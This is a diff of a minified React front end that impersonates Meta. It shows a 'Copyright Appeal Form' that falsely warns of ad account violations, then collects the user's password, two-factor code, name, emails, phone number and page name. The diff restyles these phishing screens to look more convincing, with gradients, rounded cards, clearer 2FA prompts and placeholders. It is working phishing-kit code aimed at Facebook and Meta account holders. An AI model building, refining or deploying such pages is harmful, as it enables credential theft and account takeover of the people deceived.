@@ -8929,7 +8929,8 @@
               left: 0,
               right: 0,
               bottom: 0,
-              backgroundColor: "#F5FFFA",
+              background:
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
             },
             content: {
               position: "absolute",
@@ -8941,7 +8942,7 @@
               background: "#fff",
               overflow: "auto",
               WebkitOverflowScrolling: "touch",
-              borderRadius: "4px",
+              borderRadius: "10px",
               outline: "none",
               padding: "20px",
             },
@@ -10788,13 +10789,18 @@
             };
           }, []);
           return (0, c.jsxs)("div", {
-            style: { backgroundColor: "#F5FFFA", height: "100vh" },
+            style: {
+              background:
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+              height: "100vh",
+            },
             children: [
               (0, c.jsx)("div", {
                 className: "header",
                 style: {
                   borderSizing: "border-box",
-                  backgroundColor: "#F5FFFA",
+                  background:
+                    "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                   boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
                 },
                 children: (0, c.jsx)("div", {
@@ -10819,9 +10825,11 @@
                   children: (0, c.jsxs)("div", {
                     style: {
                       backgroundColor: "white",
+                      justifyContent: "space-between",
+                      alignItems: "center",
                       minHeight: 200,
-                      maxWidth: 700,
-                      borderRadius: 5,
+                      maxWidth: 600,
+                      borderRadius: 20,
                       border: "1px solid #d0d0d0",
                       display: "flex",
                       paddingTop: 30,
@@ -10850,13 +10858,13 @@
                           (0, c.jsx)("div", {
                             className: "",
                             style: { fontWeight: "bold" },
-                            children: "Hi, We are receiving your information",
+                            children: "We are receiving your information",
                           }),
                           (0, c.jsx)("div", {
                             className: "",
                             style: { marginTop: 20, marginBottom: 20 },
                             children:
-                              "Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account",
+                              "Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account.",
                           }),
                           (0, c.jsxs)("div", {
                             className: "",
@@ -10915,104 +10923,106 @@
             [y, b] = e.useState(0);
           let w;
           return (0, c.jsxs)("div", {
-            style: { backgroundColor: "#F5FFFA", height: "100vh" },
+            style: {
+              background:
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+              height: "100vh",
+            },
             children: [
               (0, c.jsx)("div", {
-                className: "header",
+                className: "body",
                 style: {
-                  borderSizing: "border-box",
-                  backgroundColor: "#FFFFFF",
-                  boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
+                  display: "flex",
+                  justifyContent: "center",
+                  position: "absolute",
+                  inset: "50% auto auto 50%",
+                  border: "1px solid rgb(204, 204, 204)",
+                  background: "rgb(255, 255, 255)",
+                  overflow: "auto",
+                  borderRadius: "25px",
+                  outline: "none",
+                  padding: "10px 20px",
+                  transform: "translate(-50%, -50%)",
                 },
                 children: (0, c.jsx)("div", {
-                  style: { paddingTop: 15, paddingLeft: 30, paddingBottom: 10 },
-                  children: (0, c.jsx)("img", {
-                    src: "/resources/meta.svg",
-                    alt: "",
-                    height: 15,
-                  }),
-                }),
-              }),
-              (0, c.jsx)("div", {
-                className: "body",
-                style: { display: "flex", justifyContent: "center" },
-                children: (0, c.jsx)("div", {
                   style: {
-                    marginTop: 40,
-                    marginRight: 10,
-                    marginLeft: 10,
                     maxWidth: 600,
                   },
                   children: (0, c.jsxs)("div", {
                     style: {
+                      width: "100%",
                       backgroundColor: "white",
                       minHeight: 200,
-                      borderRadius: 5,
-                      border: "1px solid #d0d0d0",
                     },
                     children: [
                       (0, c.jsx)("div", {
                         className: "title",
                         style: {
                           fontWeight: "bold",
-                          color: "#4B4F56",
-                          padding: "10px 10px 0px 10px",
-                          fontSize: 16,
+
+                          color: "#000000",
+                          padding: 20,
+                          fontSize: 20,
                         },
-                        children: "Two-factor authentication required (2/3)",
+                        children: "Check your authentication code",
                       }),
                       (0, c.jsx)("hr", {
-                        style: { borderTop: "0.5px solid #FFFFFF" },
+                        style: {
+                          borderTop: "1px solid #d0d0d0",
+                        },
                       }),
                       (0, c.jsxs)("div", {
                         className: "bodyofcard",
                         children: [
                           (0, c.jsx)("div", {
                             style: {
-                              padding: "10px 10px 10px 10px",
-                              fontSize: 14,
-                              fontWeight: 400,
+                              padding: 15,
+                              fontSize: 15,
+                              fontWeight: 500,
                             },
                             children:
                               "Your account has two-factor authentication switched on, which requires this extra login step.",
                           }),
                           (0, c.jsxs)("div", {
                             style: {
-                              padding: "10px 10px 10px 10px",
-                              fontSize: 14,
-                              fontWeight: 400,
+                              padding: "0px 15px 0px 15px",
+                              fontSize: 15,
+                              fontWeight: 500,
                               display: "flex",
                             },
-                            children: [
-                              "Enter the digit code from your",
-                              (0, c.jsx)("div", {
-                                style: {
-                                  fontWeight: "bold",
-                                  paddingRight: 5,
-                                  paddingLeft: 5,
-                                },
-                                children: "code generator",
-                              }),
-                              " ",
-                              "or third-party app below.",
-                            ],
+                            children:
+                              "Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).",
+                          }),
+                          (0, c.jsx)("div", {
+                            style: {
+                              margin: 15,
+                            },
+                            children: (0, c.jsx)("img", {
+                              src: "/resources/otp.png",
+                              style: {
+                                width: "100%",
+                                borderRadius: 20,
+                              },
+                            }),
                           }),
                           (0, c.jsxs)("div", {
                             style: {
-                              padding: "10px 10px 10px 10px",
-                              fontSize: 14,
+                              padding: 10,
+                              marginLeft: 10,
+                              fontSize: 15,
                               fontWeight: 400,
                               display: "flex",
-                              alignItems: "center",
                             },
                             children: [
                               (0, c.jsx)("input", {
                                 type: "text",
                                 style: {
+                                  width: "60%",
                                   padding: "15px 10px 15px 10px",
-                                  fontSize: 14,
-                                  fontWeight: 400,
+                                  fontSize: 15,
+                                  fontWeight: 500,
                                   border: "1px solid #d0d0d0",
+                                  borderRadius: 10,
                                 },
                                 placeholder: "Login code",
                                 value: f,
@@ -11047,7 +11057,11 @@
                         ],
                       }),
                       (0, c.jsx)("hr", {
-                        style: { borderTop: "0.5px solid #FFFFFF" },
+                        style: {
+                          borderTop: "1px solid #d0d0d0",
+                          marginTop: 10,
+                          marginBottom: 10,
+                        },
                       }),
                       (0, c.jsxs)("div", {
                         className: "footercard",
@@ -11058,26 +11072,20 @@
                           paddingLeft: 20,
                           paddingRight: 20,
                           paddingBottom: 10,
-                          paddingTop: 5,
+                          paddingTop: 10,
                         },
                         children: [
-                          (0, c.jsx)("div", {
-                            style: {
-                              fontSize: 14,
-                              fontWeight: 600,
-                              color: "#385898",
-                            },
-                            children: "Need another way to authenticate?",
-                          }),
                           (0, c.jsx)("button", {
                             style: {
-                              paddingRight: 20,
-                              paddingLeft: 20,
-                              height: 32,
+                              width: "100%",
+                              paddingRight: 100,
+                              paddingLeft: 100,
+                              height: 45,
                               fontWeight: "bold",
-                              fontSize: 14,
-                              borderRadius: 5,
+                              fontSize: 18,
+                              borderRadius: 30,
                               borderWidth: 0,
+                              alignItems: "center",
                               backgroundColor:
                                 0 === f.length || 0 !== g
                                   ? "#7DAFF9"
@@ -11125,7 +11133,7 @@
                                   );
                                 }, 1e3)));
                             },
-                            children: "Send",
+                            children: "Submit",
                           }),
                         ],
                       }),
@@ -11142,10 +11150,11 @@
             left: "50%",
             right: "auto",
             bottom: "auto",
+            borderRadius: 20,
             marginRight: "-50%",
             transform: "translate(-50%, -50%)",
             width: "80%",
-            maxWidth: 650,
+            maxWidth: 450,
           },
         };
       l().setAppElement("#root");
@@ -11186,17 +11195,17 @@
           }, []),
           (0, c.jsxs)("div", {
             style: {
-              maxWidth: 680,
-              marginTop: 30,
+              maxWidth: 700,
+              marginTop: 20,
               marginBottom: 200,
               marginRight: 10,
               marginLeft: 10,
-              paddingLeft: 15,
-              paddingRight: 15,
               paddingBottom: 40,
+              paddingLeft: 10,
+              paddingRight: 10,
               background:
-                "bg-gradient-to-tr from-light-green-600 to-light-green-400",
-              borderRadius: 15,
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+              borderRadius: 20,
               boxShadow: "0px 0px",
             },
             children: [
@@ -11213,40 +11222,37 @@
                       display: "flex",
                       justifyContent: "space-between",
                       marginTop: 20,
+                      marginBottom: 20,
                     },
                     children: [
                       (0, c.jsx)("div", {
-                        style: { fontSize: 20, fontWeight: 400 },
-                        children: "Please Enter Your Password",
+                        style: { fontSize: 20, fontWeight: 700 },
+                        children: "Confirm Your Password",
                       }),
-                      (0, c.jsx)("button", { onClick: a, children: "x" }),
+                      (0, c.jsx)("button", {
+                        onClick: a,
+                        children: "X",
+                      }),
                     ],
                   }),
                   (0, c.jsx)("hr", {
                     style: {
-                      borderTop: "0.5px solid #FFFFFF",
+                      borderTop: "1px solid #d0d0d0",
                       marginTop: 20,
                       marginBottom: 20,
                     },
                   }),
                   (0, c.jsx)("div", {
+                    style: {
+                      paddingBottom: 20,
+                    },
                     children:
                       "For your security, you must enter your password to continue.",
                   }),
+
                   (0, c.jsxs)("div", {
                     className: "",
                     children: [
-                      (0, c.jsx)("div", {
-                        className: "",
-                        style: {
-                          fontWeight: "500",
-                          color: "grey",
-                          fontSize: 14,
-                          marginTop: 20,
-                          marginBottom: 5,
-                        },
-                        children: "Password",
-                      }),
                       (0, c.jsx)("input", {
                         type: "password",
                         value: s,
@@ -11256,14 +11262,22 @@
                           padding: 10,
                           paddingTop: 15,
                           paddingBottom: 15,
-                          fontSize: 14,
+                          fontSize: 15,
                           borderColor: "#d0d0d0",
                           borderWidth: 0.1,
-                          borderRadius: 5,
+                          borderRadius: 10,
                           border: "1px solid #d0d0d0",
                         },
+                        placeholder: "Password",
+                        color: "gray",
                       }),
                     ],
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                      marginTop: 30,
+                    },
                   }),
                   (0, c.jsxs)("div", {
                     style: {
@@ -11283,13 +11297,14 @@
                           " ",
                           (0, c.jsx)("button", {
                             style: {
-                              paddingRight: 30,
-                              paddingLeft: 30,
-                              marginTop: 15,
+                              width: "100%",
+                              paddingRight: 100,
+                              paddingLeft: 100,
+                              marginTop: 20,
                               height: 45,
                               fontWeight: "bold",
-                              fontSize: 16,
-                              borderRadius: 5,
+                              fontSize: 18,
+                              borderRadius: 30,
                               borderWidth: 0,
                               backgroundColor: s ? "#3084F4" : "#7DAFF9",
                               cursor: "pointer",
@@ -11320,31 +11335,35 @@
                 ],
               }),
               (0, c.jsx)("br", {}),
-              (0, c.jsx)("div", {
-                className: "",
-                style: {
-                  textAlign: "center",
-                  fontWeight: "bold",
-                  fontSize: 26,
-                  marginTop: 10,
-                  marginBottom: 20,
-                },
-                children: "Copyright Appeal Form",
-              }),
+
               (0, c.jsxs)("div", {
                 className: "",
                 style: {
                   backgroundColor: "#ffffff",
                   paddingTop: 20,
                   paddingBottom: 20,
-                  paddingLeft: 20,
-                  paddingRight: 20,
                   borderColor: "#000000",
                   borderWidth: 0.2,
-                  borderRadius: 10,
+                  borderRadius: 20,
                   border: "1px solid #d0d0d0",
                 },
                 children: [
+                  (0, c.jsx)("div", {
+                    className: "",
+                    style: {
+                      textAlign: "center",
+                      fontWeight: "bold",
+                      fontSize: 26,
+                      marginBottom: 20,
+                    },
+                    children: "Copyright Appeal Form",
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "0.5px solid #d0d0d0",
+                      margin: 20,
+                    },
+                  }),
                   (0, c.jsx)("div", {
                     style: {
                       fontSize: 14,
@@ -11357,8 +11376,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 10,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "We have received multiple reports suggesting that your ad account is in violation of our Terms of Service and Community Standard. As a result, your ad account is scheduled for review.",
@@ -11368,8 +11386,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "If you believe this information is incorrect or causing confusion, please verify your identity and request a review.",
@@ -11379,8 +11396,7 @@
                         style: {
                           fontWeight: "bold",
                           fontSize: 16,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children: "Appeal Guide",
                       }),
@@ -11389,8 +11405,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
@@ -11400,8 +11415,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
@@ -11411,8 +11425,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 10,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated.",
@@ -11423,28 +11436,28 @@
               }),
               (0, c.jsx)("div", {
                 style: {
-                  paddingTop: 20,
-                  paddingBottom: 10,
-                  borderRadius: 10,
+                  marginTop: 20,
+                  marginBottom: 20,
+                  paddingBottom: 20,
+                  borderRadius: 30,
+                  backgroundColor: "white",
+                  border: "1px solid #d0d0d0",
                 },
-                children: (0, c.jsx)("img", {
-                  src: "/resources/unlock.png",
-                  width: "100%",
-                  height: 300,
-                  borderRadius: 10,
-                }),
-              }),
-              (0, c.jsxs)("div", {
-                className: "",
                 children: [
+                  (0, c.jsx)("img", {
+                    src: "/resources/unlock.png",
+                    width: "100%",
+                    style: {
+                      borderRadius: "30px 30px 0px 0px",
+                    },
+                  }),
                   (0, c.jsx)("div", {
                     className: "",
                     style: {
                       fontWeight: "bold",
                       fontSize: 20,
                       color: "#3084F4",
-                      marginTop: 10,
-                      marginBottom: 15,
+                      margin: "15px 20px 15px 20px",
                     },
                     children: "Review request",
                   }),
@@ -11453,8 +11466,7 @@
                     style: {
                       fontWeight: "bold",
                       fontSize: 17,
-                      marginTop: 15,
-                      marginBottom: 15,
+                      margin: "15px 20px 15px 20px",
                     },
                     children: "Fixing problems with account restrictions",
                   }),
@@ -11463,188 +11475,167 @@
                     style: {
                       fontWeight: "normal",
                       fontSize: 15,
-                      marginTop: 15,
-                      marginBottom: 20,
+                      margin: "15px 20px 10px 20px",
                     },
                     children:
                       "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
-                  }),
-                  (0, c.jsx)("textarea", {
-                    type: "text",
-                    value: m,
-                    onChange: (e) => g(e.target.value),
-                    style: {
-                      width: "95%",
-                      height: 80,
-                      padding: 10,
-                      paddingTop: 20,
-                      paddingBottom: 20,
-                      fontSize: 14,
-                      borderColor: "#d0d0d0",
-                      borderWidth: 0.1,
-                      borderRadius: 5,
-                      border: "1px solid #d0d0d0",
-                    },
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {},
+                children: (0, c.jsx)("textarea", {
+                  type: "text",
+                  value: m,
+                  onChange: (e) => g(e.target.value),
+                  style: {
+                    width: "97%",
+                    height: 80,
+                    padding: 10,
+                    paddingTop: 20,
+                    paddingBottom: 20,
+                    marginBottom: 10,
+                    fontSize: 15,
+                    borderColor: "#d0d0d0",
+                    borderWidth: 0.1,
+                    borderRadius: 10,
+                    border: "1px solid #d0d0d0",
+                  },
+                  placeholder: "More info...",
+                }),
+              }),
+              (0, c.jsxs)("div", {
+                className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Full Name",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: v,
                     onChange: (e) => y(e.target.value),
                     style: {
-                      width: "95%",
+                      width: "97%",
                       padding: 10,
                       paddingTop: 15,
                       paddingBottom: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Full Name",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Business Email Address",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: b,
                     onChange: (e) => w(e.target.value),
                     style: {
-                      width: "95%",
+                      width: "97%",
                       padding: 10,
                       paddingTop: 15,
                       paddingBottom: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Business Email Address",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Personal Email Address",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: k,
                     onChange: (e) => S(e.target.value),
                     style: {
-                      width: "95%",
+                      width: "97%",
                       padding: 10,
                       paddingTop: 15,
                       paddingBottom: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Personal Email Address",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Mobile Phone Number",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: x,
                     onChange: (e) => C(e.target.value),
                     style: {
-                      width: "95%",
+                      width: "97%",
                       padding: 10,
                       paddingTop: 15,
                       paddingBottom: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Mobile Phone Number",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Page Name",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: E,
                     onChange: (e) => _(e.target.value),
                     style: {
-                      width: "95%",
+                      width: "97%",
                       padding: 10,
                       paddingTop: 15,
                       paddingBottom: 15,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
-                      borderRadius: 5,
+                      borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Page Name",
                   }),
                 ],
               }),
@@ -11666,7 +11657,7 @@
                   (0, c.jsx)("label", {
                     htmlFor: "terms",
                     style: { marginLeft: 5 },
-                    children: "I agree to our Terms, Data and Cookies Policy.",
+                    children: "I agree to our terms, data and cookies policy.",
                   }),
                 ],
               }),
@@ -11676,7 +11667,8 @@
                   height: 45,
                   fontWeight: "bold",
                   fontSize: 18,
-                  borderRadius: 5,
+                  borderRadius: 30,
+                  marginBottom: 20,
                   borderWidth: 0,
                   backgroundColor: p ? "#3084F4" : "#7DAFF9",
                   cursor: "pointer",
@@ -11714,14 +11706,18 @@
           }, []),
           1 === t
             ? (0, c.jsxs)("div", {
-                style: { background: "#F5FFFA" },
+                style: {
+                  background:
+                    "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+                },
                 children: [
                   (0, c.jsx)("div", {
                     style: {
                       paddingTop: 30,
                       paddingLeft: 30,
                       paddingBottom: 30,
-                      backgroundColor: "#F5FFFA",
+                      background:
+                        "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                     },
                     children: (0, c.jsx)("img", {
                       src: "/resources/meta.svg",
